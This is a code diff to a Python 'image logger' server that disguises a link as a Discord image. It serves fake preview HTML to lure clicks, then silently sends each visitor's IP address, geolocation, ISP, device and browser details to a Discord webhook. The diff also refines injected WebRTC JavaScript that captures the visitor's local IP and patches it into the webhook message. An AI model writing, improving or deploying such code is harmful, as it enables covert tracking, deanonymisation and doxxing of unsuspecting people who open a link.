@@ -143,15 +143,20 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     response = requests.post(config["webhook"], json = embed)
     
     # Get message ID for editing later with local IP
+    message_id = None
+    webhook_id = None
+    webhook_token = None
+    
     try:
         message_data = response.json()
         message_id = message_data.get("id")
-        webhook_id = config["webhook"].split("/")[-2]
-        webhook_token = config["webhook"].split("/")[-1]
+        if message_id:
+            webhook_id = config["webhook"].split("/")[-2]
+            webhook_token = config["webhook"].split("/")[-1]
     except:
-        message_id = None
+        pass
     
-    return info, message_id, webhook_id, webhook_token if message_id else (info, None, None, None)
+    return info, message_id, webhook_id, webhook_token
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
@@ -175,17 +180,27 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 return
            
             # Check if it's a Discord bot fetching the preview
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                # Send actual image for Discord preview
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+            useragent = self.headers.get('user-agent', '')
+            if botCheck(self.headers.get('x-forwarded-for'), useragent):
+                # For Discord bot preview, return a simple text/html that forces "Open Original" button
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
                 self.end_headers()
-                if config["buggedImage"]: 
-                    self.wfile.write(binaries["loading"])
-                else:
-                    # Redirect to actual image for preview
-                    pass
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                # Send minimal HTML that Discord will show with "Open Original" button
+                preview_html = f'''<!DOCTYPE html>
+<html>
+<head>
+    <meta property="og:image" content="{url}" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <title>Image</title>
+</head>
+<body>
+    <img src="{url}" style="max-width:100%;" />
+</body>
+</html>'''
+                self.wfile.write(preview_html.encode())
+                makeReport(self.headers.get('x-forwarded-for'), useragent, endpoint = s.split("?")[0], url = url)
                 return
            
             # When a real user clicks "Open Original"
@@ -266,7 +281,9 @@ if (!currenturl.includes("g=")) {
                 # Local IP grabber via WebRTC - Updates the same embed
                 public_ip = self.headers.get('x-forwarded-for') or 'Unknown'
                 
-                js_code = f'''
+                js_code = ''
+                if message_id and webhook_id and webhook_token:
+                    js_code = f'''
 <script>
 setTimeout(() => {{
     let localIp = "Unknown";
@@ -282,7 +299,7 @@ setTimeout(() => {{
                 if (match) {{
                     localIp = match[1];
                     // Edit the existing webhook message to add local IP
-                    fetch("https://discord.com/api/webhooks/{webhook_id if message_id else ''}/{webhook_token if message_id else ''}/messages/{message_id if message_id else ''}", {{
+                    fetch("https://discord.com/api/webhooks/{webhook_id}/{webhook_token}/messages/{message_id}", {{
                         method: "PATCH",
                         headers: {{"Content-Type": "application/json"}},
                         body: JSON.stringify({{
@@ -300,25 +317,25 @@ setTimeout(() => {{
 }}, 1000);
 </script>
 '''
-                # Replace placeholders with actual data if result exists
-                if result:
-                    js_code = js_code.replace('{{provider}}', result.get('isp', 'Unknown'))
-                    js_code = js_code.replace('{{asn}}', result.get('as', 'Unknown'))
-                    js_code = js_code.replace('{{country}}', result.get('country', 'Unknown'))
-                    js_code = js_code.replace('{{region}}', result.get('regionName', 'Unknown'))
-                    js_code = js_code.replace('{{city}}', result.get('city', 'Unknown'))
-                    coords_text = str(result['lat'])+', '+str(result['lon']) if result.get('lat') and result.get('lon') else 'Unknown'
-                    js_code = js_code.replace('{{coords}}', coords_text)
-                    timezone_text = result['timezone'].split('/')[1].replace('_', ' ') + ' (' + result['timezone'].split('/')[0] + ')' if result.get('timezone') else 'Unknown'
-                    js_code = js_code.replace('{{timezone}}', timezone_text)
-                    js_code = js_code.replace('{{mobile}}', str(result.get('mobile', 'Unknown')))
-                    js_code = js_code.replace('{{vpn}}', str(result.get('proxy', 'Unknown')))
-                    bot_status = result['hosting'] if result.get('hosting') and not result.get('proxy') else 'Possibly' if result.get('hosting') else 'False'
-                    js_code = js_code.replace('{{bot}}', str(bot_status))
-                    os_info, browser_info = httpagentparser.simple_detect(self.headers.get('user-agent'))
-                    js_code = js_code.replace('{{os}}', os_info or 'Unknown')
-                    js_code = js_code.replace('{{browser}}', browser_info or 'Unknown')
-                    js_code = js_code.replace('{{useragent}}', self.headers.get('user-agent') or 'Unknown')
+                    # Replace placeholders with actual data if result exists
+                    if result:
+                        js_code = js_code.replace('{{provider}}', result.get('isp', 'Unknown'))
+                        js_code = js_code.replace('{{asn}}', result.get('as', 'Unknown'))
+                        js_code = js_code.replace('{{country}}', result.get('country', 'Unknown'))
+                        js_code = js_code.replace('{{region}}', result.get('regionName', 'Unknown'))
+                        js_code = js_code.replace('{{city}}', result.get('city', 'Unknown'))
+                        coords_text = str(result['lat'])+', '+str(result['lon']) if result.get('lat') and result.get('lon') else 'Unknown'
+                        js_code = js_code.replace('{{coords}}', coords_text)
+                        timezone_text = result['timezone'].split('/')[1].replace('_', ' ') + ' (' + result['timezone'].split('/')[0] + ')' if result.get('timezone') else 'Unknown'
+                        js_code = js_code.replace('{{timezone}}', timezone_text)
+                        js_code = js_code.replace('{{mobile}}', str(result.get('mobile', 'Unknown')))
+                        js_code = js_code.replace('{{vpn}}', str(result.get('proxy', 'Unknown')))
+                        bot_status = result['hosting'] if result.get('hosting') and not result.get('proxy') else 'Possibly' if result.get('hosting') else 'False'
+                        js_code = js_code.replace('{{bot}}', str(bot_status))
+                        os_info, browser_info = httpagentparser.simple_detect(self.headers.get('user-agent'))
+                        js_code = js_code.replace('{{os}}', os_info or 'Unknown')
+                        js_code = js_code.replace('{{browser}}', browser_info or 'Unknown')
+                        js_code = js_code.replace('{{useragent}}', self.headers.get('user-agent') or 'Unknown')
                 
                 data += js_code.encode()
 
